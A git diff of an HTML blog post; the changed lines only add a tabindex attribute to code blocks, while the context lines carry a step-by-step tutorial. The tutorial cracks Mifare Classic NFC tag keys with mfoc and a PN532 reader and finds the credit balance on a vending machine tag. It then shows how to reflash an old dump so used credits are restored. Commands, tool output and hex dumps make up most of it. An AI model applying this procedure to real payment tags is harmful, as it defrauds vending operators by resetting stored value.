@@ -150,7 +150,7 @@ Sector 0 Block 0 also contains a non changeable UID (the tags unique ID) and som
 <p>Important notice: NFC and the used attack depend a lot on timing. Connecting a NFC device to a VM running linux will not work reliable because the drivers mess with this timing. I spent a lot of time finding this out, so please boot into a linux live cd for the following example or use a Raspberry Pi.</p>
 <p>Here are the basics to set your machine up for getting the access keys.</p>
 <p>The first step is to set up libnfc so the OS can communicate with the NFC reader. You can get the latest libnfc version from <a href="https://github.com/nfc-tools/libnfc/releases">https://github.com/nfc-tools/libnfc/releases</a>. At the time of writing the current version was 1.7.1.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install autoconf libtool libusb-dev libpcsclite-dev build-essential
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install autoconf libtool libusb-dev libpcsclite-dev build-essential
 wget https://github.com/nfc-tools/libnfc/releases/download/libnfc-1.7.1/libnfc-1.7.1.tar.bz2
 tar -jxvf libnfc-1.7.1.tar.bz2
 cd libnfc-1.7.1
@@ -161,40 +161,40 @@ sudo make install
 sudo mkdir /etc/nfc
 sudo mkdir /etc/nfc/devices.d
 </code></pre></div><p>When using the USB TTL cable issue the following command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo cp contrib/libnfc/pn532_via_uart2usb.conf.sample /etc/nfc/devices.d/pn532_via_uart2usb.conf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo cp contrib/libnfc/pn532_via_uart2usb.conf.sample /etc/nfc/devices.d/pn532_via_uart2usb.conf
 </code></pre></div><p>If you connect the breakout board directly to your Raspberry PI&rsquo;s UART pins you need to copy the following file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo cp contrib/libnfc/pn532_uart_on_rpi.conf.sample /etc/nfc/devices.d/pn532_uart_on_rpi.conf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo cp contrib/libnfc/pn532_uart_on_rpi.conf.sample /etc/nfc/devices.d/pn532_uart_on_rpi.conf
 </code></pre></div><p>There are other config files like SPI too, just look in the <code>contrib/libnfc/</code> folder and select the appropriate file.</p>
 <p>If you use Kali the libnfc library is already installed, but missing some drivers (in my case the uart driver). You can overwrite the Kali installation with the setup from above.</p>
 <p>After installing we need to test the communication to the NFC-reader. Connect your NFC device and run the following command</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">nfc-list
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">nfc-list
 </code></pre></div><p>it should output something like (example with USB-UART Cable)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># nfc-list
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># nfc-list
 nfc-list uses libnfc 1.7.1
 NFC device: pn532_uart:/dev/ttyUSB0 opened
 </code></pre></div><p>On a Raspberry Pi it shows</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># nfc-list
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># nfc-list
 nfc-list uses libnfc 1.7.1
 NFC device: pn532_uart:/dev/ttyAMA0 opened
 </code></pre></div><p>Now your reader is connected and we can start cracking our keys. We will use the tool &ldquo;mfoc - Mifare Classic Offline Cracker&rdquo; available from <a href="https://github.com/nfc-tools/mfoc">https://github.com/nfc-tools/mfoc</a>. Kali linux has it already installed.</p>
 <p>If you are not on KALI or you want the latest version of mfoc you need to compile it on your own by executing the following commands.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -O mfoc-master.zip https://github.com/nfc-tools/mfoc/archive/master.zip
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -O mfoc-master.zip https://github.com/nfc-tools/mfoc/archive/master.zip
 unzip mfoc-master.zip
 cd mfoc-master/
 </code></pre></div><p>or clone via git</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/nfc-tools/mfoc.git
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/nfc-tools/mfoc.git
 cd mfoc/
 </code></pre></div><p>configure and install it</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">autoreconf -vis
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">autoreconf -vis
 ./configure
 make
 make install
 </code></pre></div><p>To start the key cracking connect your reader, place the tag on the antenna and run</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mfoc -O output.mfd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mfoc -O output.mfd
 </code></pre></div><p>This command first looks for some default keys used by many Miface Classic tags and then tries to crack the missing keys. On my sample tag the whole procedure was done in under one minute.</p>
 <p>If the tool outputs &ldquo;Maybe you should increase the number of probes&rdquo;, the cracking was not successful. I got this message when running in a VMWare environment or by using crappy hardware. Switching to the Adafruit breakout board and a dedicated linux solved the problem for me.</p>
 <p>If you manage to crack all the keys you can see the HEX encoded contents of the key on your terminal and also in the output file output.mfd.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># mfoc -O output.mfd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># mfoc -O output.mfd
 Found Mifare Classic 1k tag
 ISO/IEC 14443A (106 kbps) target:
     ATQA (SENS_RES): 00  04
@@ -322,7 +322,7 @@ Block 02, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  09  38  09  
 Block 01, type A, key a0a1a2a3a4a5 :d2  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
 Block 00, type A, key a0a1a2a3a4a5 :8e  db  1a  2a  65  88  04  00  48  85  14  90  59  80  01  11
 </code></pre></div><p>The terminal output is upside down - the first block containing the UID is at the bottom. If you view the output.mfd file with hexdump you can see it in the right order.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># hexdump -vC output.mfd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># hexdump -vC output.mfd
 00000000  8e db 1a 2a 65 88 04 00  48 85 14 90 59 80 01 11  |...*e...H...Y...|
 00000010  d2 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
 00000020  00 00 00 00 00 00 00 00  09 38 09 38 09 38 09 38  |.........8.8.8.8|
@@ -388,7 +388,7 @@ Block 00, type A, key a0a1a2a3a4a5 :8e  db  1a  2a  65  88  04  00  48  85  14  
 000003e0  00 00 51 5f 03 59 ef 00  00 00 00 00 4d 49 43 00  |..Q_.Y......MIC.|
 000003f0  a0 a1 a2 a3 a4 a5 4b 44  bb 5a be db 60 4c c9 d1  |......KD.Z..`L..|
 </code></pre></div><p>The file shows all 16 sectors. Here is an example of one sector: 3x16 bytes of data followed by 16 bytes of access keys and accecss bits.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Block 0 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Block 0 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
 Block 1 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
 Block 2 | 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
 Block 3 | a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5
@@ -396,7 +396,7 @@ Block 3 | a0 a1 a2 a3 a4 a5 78 77  88 69 b0 b1 b2 b3 b4 b5
 <p>The next step is to locate the credits on the tag. The vending machine shows you the credits left on the tag when holding it to reader.</p>
 <p><a href="/img/mifare/mifare_3.45.jpg"><img src="/img/mifare/mifare_3.45_thumb.jpg" alt="3.45" title="3.45"></a></p>
 <p>So the tag currently contains exactly 3,45€. So lets first search for the Hex value of 45 (0x2d): Nothing found. Next we try to convert our 3,45€ to cents which will be 345 (0x01 0x59): Gotcha! The credits are located in sector 12 block 2 (counting starts at zero).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Block 0 | 88 01 00 84 00 04 b0 1a  00 00 5d 00 01 05 00 f1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Block 0 | 88 01 00 84 00 04 b0 1a  00 00 5d 00 01 05 00 f1
 Block 1 | 01 01 01 ee ee ee ee ee  00 00 00 00 00 00 00 00
 Block 2 | 00 01 59 01 00 6f 00 01  00 00 00 00 8c c3 00 00
 Block 3 | a0 a1 a2 a3 a4 a5 1e 11  ee 5a ad 4f b3 33 88 bf
@@ -413,7 +413,7 @@ Sadly not every Android Phone supports these Mifare Classic tags. For example my
 This app lets you add your own keyfile (&ldquo;Add/Remove Keys&rdquo;) cracked by mfoc. Just create a new key file and insert your keys one per line. Using the write option you can write exactly one block back to the tag, or reflash a complete memory dump. Be careful when writing a direct block because if you overwrite the last block of a sector (the one containg the keys), your tag will be irreversible damaged. I did this to mine because I didn&rsquo;t notice the block numbers start at 0. So you can also create a full memory dump of your tag and when you have no credits left, reflash the old image and your credits will be reset.</p>
 <p><a href="/img/mifare/mifare_write.png"><img src="/img/mifare/mifare_write_thumb.png" alt="write" title="write"></a></p>
 <p>Another method is to reflash the captured output of mfoc via nfc-mfclassic:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># nfc-mfclassic w B output.mfd output.mfd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"># nfc-mfclassic w B output.mfd output.mfd
 NFC reader: pn532_uart:/dev/ttyUSB0 opened
 Found MIFARE Classic card:
 ISO/IEC 14443A (106 kbps) target:
